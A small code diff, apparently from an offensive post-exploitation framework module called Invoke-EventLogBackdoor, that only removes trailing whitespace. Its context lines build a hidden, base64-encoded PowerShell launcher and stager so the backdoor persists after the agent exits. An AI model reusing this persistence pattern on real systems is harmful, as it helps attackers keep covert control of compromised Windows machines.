@@ -164,7 +164,7 @@ Invoke-EventLogBackdoor"""
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
-        launcher = helpers.powershell_launcher(script, modifiable_launcher) 
+        launcher = helpers.powershell_launcher(script, modifiable_launcher)
         stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
         parts = stagerCode.split(" ")
 
